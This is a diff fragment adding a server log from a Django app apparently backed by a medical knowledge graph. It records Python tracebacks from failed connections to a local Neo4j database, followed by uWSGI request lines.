+    conn.request(method, url, **httplib_request_kw)
+  File "/usr/local/lib/python3.7/http/client.py", line 1229, in request
+    self._send_request(method, url, body, headers, encode_chunked)
+  File "/usr/local/lib/python3.7/http/client.py", line 1275, in _send_request
+    self.endheaders(body, encode_chunked=encode_chunked)
+  File "/usr/local/lib/python3.7/http/client.py", line 1224, in endheaders
+    self._send_output(message_body, encode_chunked=encode_chunked)
+  File "/usr/local/lib/python3.7/http/client.py", line 1016, in _send_output
+    self.send(msg)
+  File "/usr/local/lib/python3.7/http/client.py", line 956, in send
+    self.connect()
+  File "/usr/local/lib/python3.7/site-packages/urllib3/connection.py", line 181, in connect
+    conn = self._new_conn()
+  File "/usr/local/lib/python3.7/site-packages/urllib3/connection.py", line 168, in _new_conn
+    self, "Failed to establish a new connection: %s" % e)
+urllib3.exceptions.NewConnectionError: <urllib3.connection.HTTPConnection object at 0x7fcc0d7c7470>: Failed to establish a new connection: [Errno 111] Connection refused
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/usr/local/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/usr/local/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "./Django/consoles_view.py", line 42, in consoles
+    result = getNode(request)
+  File "./Django/consoles_view.py", line 22, in getNode
+    result = find.matchNodeRelationbyTitle('疾病', titles[num])
+  File "./toolkit/neo4j_operation/neo4j_crud.py", line 36, in matchNodeRelationbyTitle
+    p = graph.run('match (n:' + nodeName + ')-[]-(x) where n.title="' + value + '" return n, x, id(n) as '
+  File "/usr/local/lib/python3.7/site-packages/py2neo/database.py", line 526, in run
+    return self.begin(autocommit=True).run(cypher, parameters, **kwparameters)
+  File "/usr/local/lib/python3.7/site-packages/py2neo/database.py", line 805, in run
+    entities=entities))
+  File "/usr/local/lib/python3.7/site-packages/py2neo/internal/connectors.py", line 370, in run
+    r = self._post("/db/data/transaction/%s" % (tx or "commit"), statement, hydrator.dehydrate(parameters))
+  File "/usr/local/lib/python3.7/site-packages/py2neo/internal/connectors.py", line 361, in _post
+    body=json_dumps({"statements": statements}))
+  File "/usr/local/lib/python3.7/site-packages/urllib3/request.py", line 72, in request
+    **urlopen_kw)
+  File "/usr/local/lib/python3.7/site-packages/urllib3/request.py", line 150, in request_encode_body
+    return self.urlopen(method, url, **extra_kw)
+  File "/usr/local/lib/python3.7/site-packages/urllib3/connectionpool.py", line 667, in urlopen
+    **response_kw)
+  File "/usr/local/lib/python3.7/site-packages/urllib3/connectionpool.py", line 667, in urlopen
+    **response_kw)
+  File "/usr/local/lib/python3.7/site-packages/urllib3/connectionpool.py", line 667, in urlopen
+    **response_kw)
+  File "/usr/local/lib/python3.7/site-packages/urllib3/connectionpool.py", line 638, in urlopen
+    _stacktrace=sys.exc_info()[2])
+  File "/usr/local/lib/python3.7/site-packages/urllib3/util/retry.py", line 398, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+urllib3.exceptions.MaxRetryError: HTTPConnectionPool(host='localhost', port=7474): Max retries exceeded with url: /db/data/transaction/commit (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7fcc0d7c7470>: Failed to establish a new connection: [Errno 111] Connection refused'))
+[pid: 13376|app: 0|req: 3/3] 112.10.182.10 () {44 vars in 846 bytes} [Sun Mar 17 09:56:34 2019] GET /views/consoles/ => generated 212021 bytes in 1214 msecs (HTTP/1.1 500) 4 headers in 130 bytes (1 switches on core 0)
+[pid: 13376|app: 0|req: 4/4] 112.10.182.10 () {46 vars in 892 bytes} [Sun Mar 17 09:56:47 2019] GET /views/consoles/ => generated 11159 bytes in 3464 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 1)
+[pid: 13376|app: 0|req: 5/5] 112.10.182.10 () {44 vars in 856 bytes} [Sun Mar 17 09:56:53 2019] GET /views/interlocution/ => generated 4135 bytes in 3 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 0)
